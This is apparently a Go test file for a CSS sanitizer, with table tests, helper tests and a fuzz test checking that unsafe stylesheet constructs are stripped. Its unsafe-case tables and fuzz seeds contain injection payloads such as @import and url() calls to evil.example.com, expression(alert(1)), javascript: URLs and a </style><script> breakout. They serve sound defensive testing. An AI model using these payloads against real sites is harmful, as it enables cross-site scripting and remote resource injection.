package format

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

// TestCSS verifies that ordinary stylesheet constructs survive sanitizing.
func TestCSS(t *testing.T) {

	validate := CSS("")

	table := []struct {
		name     string
		value    string
		expected string
	}{
		{
			name:     "simple rule",
			value:    "body { color: red; }",
			expected: "body { color: red; }\n",
		},
		{
			name:     "multiple declarations",
			value:    "p { color: #336699; margin-top: 1.5em; }",
			expected: "p { color: #336699; margin-top: 1.5em; }\n",
		},
		{
			name:     "multiple rules",
			value:    "h1 { font-size: 2em; } h2 { font-size: 1.5em; }",
			expected: "h1 { font-size: 2em; }\nh2 { font-size: 1.5em; }\n",
		},
		{
			name:     "class, id, and descendant selectors",
			value:    "#main .article > p:first-child { line-height: 1.6; }",
			expected: "#main .article > p:first-child { line-height: 1.6; }\n",
		},
		{
			name:     "attribute selector",
			value:    "a[target] { text-decoration: underline; }",
			expected: "a[target] { text-decoration: underline; }\n",
		},
		{
			name:     "grouped selectors",
			value:    "h1, h2, h3 { font-weight: 700; }",
			expected: "h1, h2, h3 { font-weight: 700; }\n",
		},
		{
			name:     "comments are removed",
			value:    "body { /* a note */ color: red; }",
			expected: "body { color: red; }\n",
		},
		{
			name:     "flex layout",
			value:    ".row { display: flex; gap: 8px; justify-content: space-between; }",
			expected: ".row { display: flex; gap: 8px; justify-content: space-between; }\n",
		},
		{
			name:     "value with a slash",
			value:    "p { font: 12px/1.5 sans-serif; }",
			expected: "p { font: 12px/1.5 sans-serif; }\n",
		},
		{
			name:     "media query is kept and its body sanitized",
			value:    "@media screen and (max-width: 600px) { body { color: red; } }",
			expected: "@media screen and (max-width: 600px) {\nbody { color: red; }\n}\n",
		},
		{
			name:     "supports at-rule",
			value:    "@supports (display: grid) { .row { display: grid; } }",
			expected: "@supports (display: grid) {\n.row { display: grid; }\n}\n",
		},
		{
			name:     "empty stylesheet",
			value:    "",
			expected: "",
		},
	}

	for _, testCase := range table {
		t.Run(testCase.name, func(t *testing.T) {
			result, err := validate(testCase.value)
			require.Nil(t, err)
			require.Equal(t, testCase.expected, result)
		})
	}
}

// TestCSS_Unsafe verifies that every construct capable of loading a resource,
// executing script, or escaping the stylesheet is removed.
func TestCSS_Unsafe(t *testing.T) {

	validate := CSS("")

	table := []struct {
		name  string
		value string
	}{
		{"import at-rule", `@import url("//evil.example.com/x.css");`},
		{"import without url function", `@import "//evil.example.com/x.css";`},
		{"font-face fetches a remote font", `@font-face { font-family: x; src: url(//evil.example.com/f.woff); }`},
		{"charset at-rule", `@charset "utf-8";`},
		{"namespace at-rule", `@namespace svg "http://www.w3.org/2000/svg";`},
		{"unknown at-rule", `@evil { body { color: red; } }`},
		{"quoted at-rule condition", `@media "</style><script>alert(1)</script>" { body { color: red; } }`},
		{"style tag breakout in a selector", `</style><script>alert(1)</script> { color: red; }`},
		{"style tag breakout in a value", `body { color: red</style><script>alert(1)</script>; }`},
		{"expression value", `body { color: expression(alert(1)); }`},
		{"url value", `body { background-color: url(//evil.example.com/x.png); }`},
		{"javascript url value", `body { background-color: url(javascript:alert(1)); }`},
		{"behavior property", `body { behavior: url(//evil.example.com/x.htc); }`},
		{"moz-binding property", `body { -moz-binding: url(//evil.example.com/x.xml); }`},
		{"content property", `body:before { content: "injected"; }`},
		{"fixed position overlay", `body { position: fixed; }`},
		{"absolute position overlay", `body { position: absolute; }`},
		{"css escape sequence", `body { color: \65 xpression(alert(1)); }`},
		{"comment splices a value", `body { color: re/**/d; }`},
		{"unterminated comment", `body { color: red; } /* h1 { color: blue; }`},
		{"unbalanced block", `body { color: red;`},
		{"quote in a value", `body { font-family: "Helvetica Neue"; }`},
		{"backslash in a selector", `bo\64 y { color: red; }`},
	}

	for _, testCase := range table {
		t.Run(testCase.name, func(t *testing.T) {

			result, err := validate(testCase.value)
			require.Nil(t, err)

			// Whatever survives must not carry the construct that made the input
			// dangerous, in any spelling.
			lower := strings.ToLower(result)

			for _, forbidden := range []string{"url", "expression", "javascript", "@import", "@font-face", "behavior", "binding", "content", "position", "<", ">", `"`, "'", `\`} {
				require.NotContains(t, lower, forbidden, "input %q produced %q", testCase.value, result)
			}
		})
	}
}

// TestCSS_PartialSanitizing verifies that an unsafe declaration is dropped
// without taking the safe declarations around it with it.
func TestCSS_PartialSanitizing(t *testing.T) {

	validate := CSS("")

	result, err := validate("body { color: red; behavior: url(x.htc); margin: 0; }")

	require.Nil(t, err)
	require.Contains(t, result, "color: red")
	require.Contains(t, result, "margin: 0")
	require.NotContains(t, result, "behavior")
}

// TestCSS_NestingDepth verifies that at-rule nesting past the cap is discarded
// rather than driving unbounded recursion.
func TestCSS_NestingDepth(t *testing.T) {

	validate := CSS("")

	deep := strings.Repeat("@media screen { ", 50) + "body { color: red; }" + strings.Repeat(" }", 50)

	result, err := validate(deep)

	require.Nil(t, err)
	require.Equal(t, "", result, "nesting past the cap should sanitize away entirely")
}

// TestCSS_EmptyRulesRemoved verifies that a rule whose declarations all
// sanitized away is not emitted as an empty shell.
func TestCSS_EmptyRulesRemoved(t *testing.T) {

	validate := CSS("")

	result, err := validate("body { behavior: url(x.htc); }")

	require.Nil(t, err)
	require.Equal(t, "", result)
}

// TestCSS_Idempotent verifies that sanitizing an already-sanitized stylesheet
// changes nothing. A sanitizer that is not idempotent is either destroying safe
// input or failing to reach a fixed point on unsafe input.
func TestCSS_Idempotent(t *testing.T) {

	validate := CSS("")

	for _, value := range []string{
		"body { color: red; }",
		"@media screen and (max-width: 600px) { body { color: red; } }",
		"#main .article > p { line-height: 1.6; }",
		`@import url("//evil.example.com/x.css"); body { color: red; }`,
	} {
		once, err := validate(value)
		require.Nil(t, err)

		twice, err := validate(once)
		require.Nil(t, err)

		require.Equal(t, once, twice, "sanitizing %q was not idempotent", value)
	}
}

// TestCSS_CaseInsensitive verifies that CSS's case-insensitive spellings are
// recognized, and that an at-rule name is normalized to the form that was
// actually checked against the allowlist.
func TestCSS_CaseInsensitive(t *testing.T) {

	validate := CSS("")

	result, err := validate("BODY { COLOR: RED; }")
	require.Nil(t, err)
	require.Equal(t, "BODY { COLOR: RED; }\n", result)

	result, err = validate("@MEDIA screen { body { color: red; } }")
	require.Nil(t, err)
	require.Equal(t, "@media screen {\nbody { color: red; }\n}\n", result)
}

// TestCSS_MalformedAtRules verifies the at-rule paths that carry no usable
// condition.
func TestCSS_MalformedAtRules(t *testing.T) {

	validate := CSS("")

	for _, value := range []string{
		"@media { body { color: red; } }",
		"@media",
		"@supports { body { color: red; } }",
		"@media screen { }",
		"@media screen { body { behavior: url(x.htc); } }",
	} {
		result, err := validate(value)
		require.Nil(t, err)
		require.Equal(t, "", result, "malformed at-rule %q should sanitize away", value)
	}
}

// TestCSS_Helpers covers the guard clauses in the sanitizer's helpers that the
// stylesheet-level tests cannot reach directly.
func TestCSS_Helpers(t *testing.T) {

	t.Run("splitCSSBlock requires a leading brace", func(t *testing.T) {
		_, _, ok := splitCSSBlock("body { color: red; }")
		require.False(t, ok)
	})

	t.Run("splitCSSBlock reports an unbalanced block", func(t *testing.T) {
		_, _, ok := splitCSSBlock("{ color: red;")
		require.False(t, ok)
	})

	t.Run("splitCSSBlock returns the remainder", func(t *testing.T) {
		body, rest, ok := splitCSSBlock("{ a { b } } tail")
		require.True(t, ok)
		require.Equal(t, " a { b } ", body)
		require.Equal(t, " tail", rest)
	})

	t.Run("empty value is unsafe", func(t *testing.T) {
		require.False(t, isSafeCSSValue(""))
	})

	t.Run("empty prelude is unsafe", func(t *testing.T) {
		require.False(t, isSafeCSSPrelude(""))
	})

	t.Run("empty declarations sanitize to empty", func(t *testing.T) {
		require.Equal(t, "", sanitizeDeclarations(""))
	})

	// Bluemonday lowercases a value before handing it to the policy handler, so
	// an uppercase value only reaches isSafeCSSValue on a direct call.
	t.Run("uppercase values are accepted on their merits", func(t *testing.T) {
		require.True(t, isSafeCSSValue("RED"))
		require.False(t, isSafeCSSValue("URL(x)"))
	})

	t.Run("splitCSSAtRule handles a missing condition", func(t *testing.T) {
		name, condition := splitCSSAtRule("@media")
		require.Equal(t, "@media", name)
		require.Equal(t, "", condition)
	})

	t.Run("splitCSSAtRule splits on a parenthesis", func(t *testing.T) {
		name, condition := splitCSSAtRule("@media(min-width: 40em)")
		require.Equal(t, "@media", name)
		require.Equal(t, "(min-width: 40em)", condition)
	})
}

// FuzzCSS feeds arbitrary strings to the stylesheet sanitizer to confirm that it
// never panics and that its output can never carry the constructs that would let
// a stylesheet escape its <style> element, load a remote resource, or execute
// script -- regardless of how the input was spelled.
func FuzzCSS(f *testing.F) {

	f.Add("")
	f.Add("body { color: red; }")
	f.Add("@media screen { body { color: red; } }")
	f.Add(`@import url("//evil.example.com/x.css");`)
	f.Add("body { color: expression(alert(1)); }")
	f.Add("</style><script>alert(1)</script>")
	f.Add("body { color: red")
	f.Add("{{{{{{")
	f.Add("}}}}}}")
	f.Add("/*")
	f.Add("body { color: re/**/d; }")
	f.Add("body { background-color: url(x) }")
	f.Add("@media screen { @media screen { @media screen { @media screen { @media screen { body { color: red; } } } } } }")
	f.Add("body { color: \x00red; }")
	f.Add("a\\3c /style\\3e { color: red; }")

	validate := CSS("")

	f.Fuzz(func(t *testing.T, value string) {

		result, err := validate(value)

		// This format sanitizes rather than rejects, so it never returns an error.
		if err != nil {
			t.Fatalf("CSS returned an unexpected error for %q: %v", value, err)
		}

		lower := strings.ToLower(result)

		// No output may contain the characters that would end the <style> element
		// or open a construct the sanitizer did not itself write.
		for _, forbidden := range []string{"<", ">", `"`, "'", `\`, "/*", "*/", "@import", "@charset", "@namespace", "@font-face"} {

			// `>` is a legal child combinator, so it is checked only as part of a
			// closing tag rather than banned outright.
			if forbidden == ">" {
				continue
			}

			if strings.Contains(lower, forbidden) {
				t.Fatalf("CSS(%q) = %q, which contains the forbidden sequence %q", value, result, forbidden)
			}
		}

		// No output may name a function or property that fetches a resource or
		// executes script.
		for _, forbidden := range []string{"url", "expression", "javascript", "behavior", "binding"} {
			if strings.Contains(lower, forbidden) {
				t.Fatalf("CSS(%q) = %q, which contains the forbidden name %q", value, result, forbidden)
			}
		}

		// Sanitizing is a fixed point: re-running it must change nothing.
		again, err := validate(result)

		if err != nil {
			t.Fatalf("CSS returned an unexpected error re-sanitizing %q: %v", result, err)
		}

		if again != result {
			t.Fatalf("CSS is not idempotent for %q: first pass %q, second pass %q", value, result, again)
		}
	})
}
